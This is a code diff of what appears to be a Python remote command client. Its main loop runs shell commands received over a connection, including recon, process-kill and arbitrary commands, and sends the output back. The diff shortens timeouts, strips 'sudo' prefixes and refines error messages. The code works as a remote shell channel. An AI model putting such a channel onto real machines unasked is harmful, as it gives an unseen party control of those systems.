@@ -262,22 +262,22 @@ def main_loop():
                     
                     elif cmd == "NETWORK_INFO":
                         cmd = get_command("network_info")
-                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                         output = result.stdout if result.stdout else result.stderr
                     
                     elif cmd == "LIST_FILES":
                         cmd = get_command("list_files")
-                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                         output = result.stdout if result.stdout else result.stderr
                     
                     elif cmd == "PROCESSES":
                         cmd = get_command("list_processes")
-                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                         output = result.stdout if result.stdout else result.stderr
                     
                     elif cmd == "SYSTEM_INFO":
                         cmd = get_command("system_info")
-                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
+                        result = subprocess.run(cmd, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                         output = result.stdout if result.stdout else result.stderr
                     
                     elif cmd == "RESTART":
@@ -298,13 +298,13 @@ def main_loop():
                     elif cmd.startswith("FIND_PROCESS:"):
                         name = cmd.split(":", 1)[1].strip()
                         cmd_str = get_command("find_process") + " " + name
-                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
+                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                         output = result.stdout if result.stdout else result.stderr
                     
                     elif cmd.startswith("KILL_PROCESS:"):
                         name = cmd.split(":", 1)[1].strip()
                         cmd_str = get_command("kill_process") + " " + name
-                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=10)
+                        result = subprocess.run(cmd_str, shell=True, capture_output=True, text=False, cwd=current_dir, timeout=5)
                         output = result.stdout if result.stdout else result.stderr
                     
                     else:
@@ -349,6 +349,11 @@ def main_loop():
                             cmd = "chmod"  # Keep chmod as is
                         elif cmd_lower == "chown":
                             cmd = "chown"  # Keep chown as is
+                        
+                        # Handle sudo commands on Linux
+                        if os_name == "Linux" and cmd_lower.startswith("sudo "):
+                            # Remove sudo prefix and run command directly with shell=True
+                            cmd = cmd[5:]  # Remove 'sudo ' prefix
                         
                         # Linux/Windows command mapping
                         if os_name == "Windows":
@@ -468,28 +473,39 @@ def main_loop():
                                 capture_output=True,
                                 text=False,
                                 cwd=current_dir,
-                                timeout=10
+                                timeout=5
                             )
                             
                             if result.returncode == 0:
                                 if result.stdout and len(result.stdout.strip()) > 0:
                                     output = result.stdout
                                 else:
-                                    output = f"✓ Command executed successfully: {cmd}".encode()
+                                    output = f"✓ Command executed successfully".encode()
                             else:
                                 if result.stderr and len(result.stderr.strip()) > 0:
                                     # Check for permission denied and provide helpful message
-                                    if "Permission denied" in result.stderr.decode(errors='ignore'):
-                                        output = f"❌ Permission denied. Try 'sudo {cmd}' or check directory permissions".encode()
+                                    stderr_text = result.stderr.decode(errors='ignore')
+                                    if "Permission denied" in stderr_text:
+                                        if os_name == "Linux":
+                                            output = f"❌ Permission denied. Try 'sudo {cmd}' or check directory permissions".encode()
+                                        else:
+                                            output = f"❌ Permission denied. Run as Administrator or check directory permissions".encode()
                                     else:
                                         output = result.stderr
                                 else:
                                     output = f"Command failed with code {result.returncode}".encode()
                                 
                         except subprocess.TimeoutExpired:
-                            output = "⚠️ Command timeout (10 seconds)".encode()
+                            output = "⚠️ Command timeout (5 seconds)".encode()
                         except Exception as e:
-                            output = str(e).encode()
+                            error_msg = str(e)
+                            # Handle common shell errors
+                            if "not found" in error_msg.lower():
+                                output = f"❌ Command not found: {cmd}".encode()
+                            elif "permission denied" in error_msg.lower():
+                                output = f"❌ Permission denied: {cmd}".encode()
+                            else:
+                                output = error_msg.encode()
 
                     client.send(output)
 
